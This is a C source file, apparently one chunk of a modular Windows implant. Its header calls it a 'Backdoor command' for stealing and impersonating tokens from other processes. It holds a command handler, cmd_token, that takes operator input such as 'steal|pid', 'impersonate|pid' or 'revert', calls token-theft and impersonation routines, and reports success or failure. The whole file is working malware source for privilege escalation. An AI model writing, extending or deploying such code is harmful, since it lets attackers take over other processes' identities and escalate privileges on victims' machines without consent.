// chunk: commands/cmd_token
// depends: privesc/token_steal, privesc/token_impersonate
// provides: cmd_token
// note: Backdoor command — steal/impersonate tokens from other processes

#ifndef CHUNK_CMD_TOKEN
#define CHUNK_CMD_TOKEN

static int cmd_token(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    if (!args || args_len < 1) {
        const char *msg = "FAIL: Usage: steal|pid or impersonate|pid or revert";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    char action[32] = {0};
    char target[256] = {0};

    char buf[512] = {0};
    strncpy(buf, args, args_len < sizeof(buf) - 1 ? args_len : sizeof(buf) - 1);

    char *sep = strchr(buf, '|');
    if (sep) {
        *sep = '\0';
        strncpy(action, buf, sizeof(action) - 1);
        strncpy(target, sep + 1, sizeof(target) - 1);
    } else {
        strncpy(action, buf, sizeof(action) - 1);
    }

    if (strcmp(action, "revert") == 0) {
        if (revert_to_self()) {
            const char *msg = "OK: Reverted to original token";
            DWORD len = (DWORD)strlen(msg);
            memcpy(out, msg, len < *out_len ? len : *out_len);
            *out_len = len < *out_len ? len : *out_len;
            return 0;
        } else {
            const char *msg = "FAIL: RevertToSelf failed";
            DWORD len = (DWORD)strlen(msg);
            memcpy(out, msg, len < *out_len ? len : *out_len);
            *out_len = len < *out_len ? len : *out_len;
            return 1;
        }
    }

    if (target[0] == '\0') {
        const char *msg = "FAIL: No target specified";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    DWORD pid = atoi(target);
    if (pid == 0) {
        HANDLE tok = NULL;
        if (token_steal_from_name(target, &tok) && tok) {
            char msg[256];
            snprintf(msg, sizeof(msg), "OK: Stole token from %s", target);
            DWORD len = (DWORD)strlen(msg);
            memcpy(out, msg, len < *out_len ? len : *out_len);
            *out_len = len < *out_len ? len : *out_len;
            CloseHandle(tok);
            return 0;
        }
        char msg[256];
        snprintf(msg, sizeof(msg), "FAIL: Could not find/steal token from %s", target);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    if (strcmp(action, "steal") == 0) {
        HANDLE tok = token_steal(pid);
        if (tok) {
            char msg[256];
            snprintf(msg, sizeof(msg), "OK: Stole token from PID %lu", pid);
            DWORD len = (DWORD)strlen(msg);
            memcpy(out, msg, len < *out_len ? len : *out_len);
            *out_len = len < *out_len ? len : *out_len;
            CloseHandle(tok);
            return 0;
        }
    } else if (strcmp(action, "impersonate") == 0) {
        if (impersonate_process(pid)) {
            char msg[256];
            snprintf(msg, sizeof(msg), "OK: Impersonating token from PID %lu", pid);
            DWORD len = (DWORD)strlen(msg);
            memcpy(out, msg, len < *out_len ? len : *out_len);
            *out_len = len < *out_len ? len : *out_len;
            return 0;
        }
    }

    char msg[256];
    snprintf(msg, sizeof(msg), "FAIL: %s on PID %lu failed", action, pid);
    DWORD len = (DWORD)strlen(msg);
    memcpy(out, msg, len < *out_len ? len : *out_len);
    *out_len = len < *out_len ? len : *out_len;
    return 1;
}

#endif
